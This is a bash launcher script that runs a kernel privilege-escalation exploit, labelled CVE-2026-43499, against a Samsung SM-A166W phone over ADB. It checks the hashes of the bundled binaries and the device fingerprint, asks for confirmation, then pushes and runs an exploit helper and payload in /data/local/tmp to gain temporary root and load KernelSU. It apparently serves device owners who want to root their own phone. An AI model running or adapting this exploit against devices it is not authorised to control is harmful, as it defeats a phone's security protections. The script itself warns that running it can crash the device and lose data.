#!/usr/bin/env bash
set -euo pipefail

release_dir="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
payload="$release_dir/binaries/cve-2026-43499-app-SM-A166W-DZG1-attempt10.so"
helper="$release_dir/binaries/cve-2026-43499-root-SM-A166W-DZG1-attempt10"
loader="$release_dir/kernelsu/ksud-SM-A166W-DZG1-v3.2.5"
manager="$release_dir/kernelsu/KernelSU_v3.2.5_32525-release.apk"

expected_model='SM-A166W'
expected_fingerprint='samsung/a16xcs/a16x:16/BP4A.251205.006/A166WVLS8DZG1:user/release-keys'
expected_kernel='5.15.189-android13-3-33503169'
expected_pagesize='4096'

require_tool() {
  command -v "$1" >/dev/null 2>&1 || {
    printf 'Missing required tool: %s\n' "$1" >&2
    exit 1
  }
}

verify_hash() {
  local expected="$1"
  local file="$2"
  local actual
  actual="$(sha256sum "$file" | awk '{print $1}')"
  if [[ "$actual" != "$expected" ]]; then
    printf 'Hash mismatch: %s\nexpected %s\nactual   %s\n' \
      "$file" "$expected" "$actual" >&2
    exit 1
  fi
}

require_tool adb
require_tool sha256sum

device_count="$(adb devices | awk '$2 == "device" { count++ } END { print count + 0 }')"
if [[ "$device_count" != '1' ]]; then
  printf 'Exactly one authorized ADB device is required; found %s.\n' "$device_count" >&2
  adb devices -l >&2
  exit 1
fi

verify_hash '0a9145c59df414c31dde8332f1a68aa022e58239c3c73edcb77bb67e0a24ba53' "$payload"
verify_hash '8b7e3285e99cbef5c958d5512105ef0471179484d7a8cb834d23cc882d259fd1' "$helper"
verify_hash '4d58222745b4213fb507e3c93284968535a399f27844ecc3fbccf9ca6d23e09d' "$loader"
verify_hash '1417081413bf7ab1de8e440ecbcb62685037c8f28f048f0f8b79e305b31ab916' "$manager"

actual_model="$(adb shell getprop ro.product.model | tr -d '\r')"
actual_fingerprint="$(adb shell getprop ro.build.fingerprint | tr -d '\r')"
actual_kernel="$(adb shell uname -r | tr -d '\r')"
actual_pagesize="$(adb shell getconf PAGESIZE | tr -d '\r')"

if [[ "$actual_model" != "$expected_model" ||
      "$actual_fingerprint" != "$expected_fingerprint" ||
      "$actual_kernel" != "$expected_kernel" ||
      "$actual_pagesize" != "$expected_pagesize" ]]; then
  printf '%s\n' 'Device preflight FAILED. Nothing was run.' >&2
  printf 'model:       %s\nfingerprint: %s\nkernel:      %s\npage size:   %s\n' \
    "$actual_model" "$actual_fingerprint" "$actual_kernel" "$actual_pagesize" >&2
  exit 1
fi

printf '%s\n' 'Exact device preflight passed.'
printf '%s\n' 'WARNING: this kernel exploit can panic or reboot the phone and may cause data loss.'
printf '%s\n' 'It provides temporary root only and does not flash a partition.'
read -r -p 'Type RUN-ONCE to continue: ' answer
if [[ "$answer" != 'RUN-ONCE' ]]; then
  printf '%s\n' 'Cancelled.'
  exit 0
fi

adb install -r "$manager"
adb push "$payload" /data/local/tmp/a16x-attempt10.so
adb push "$helper" /data/local/tmp/cve-2026-43499-root-attempt10
adb push "$loader" /data/local/tmp/ksud-s25u-kdp
adb shell chmod 0755 \
  /data/local/tmp/cve-2026-43499-root-attempt10 \
  /data/local/tmp/ksud-s25u-kdp
adb shell chmod 0644 /data/local/tmp/a16x-attempt10.so

adb shell \
  "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 /data/local/tmp/cve-2026-43499-root-attempt10 --run-payload /data/local/tmp/a16x-attempt10.so /data/local/tmp/cve-2026-43499-root-attempt10 /data/local/tmp/a16x-attempt10-hwcal-mcast98.log"

adb shell "/data/local/tmp/cve-2026-43499-root-attempt10 --late-load"

printf '%s\n' '===== KernelSU module ====='
adb shell 'grep "^kernelsu " /proc/modules || true'
printf '%s\n' '===== SELinux ====='
adb shell getenforce
printf '%s\n' 'Finished. Open KernelSU Manager to grant root to trusted apps.'
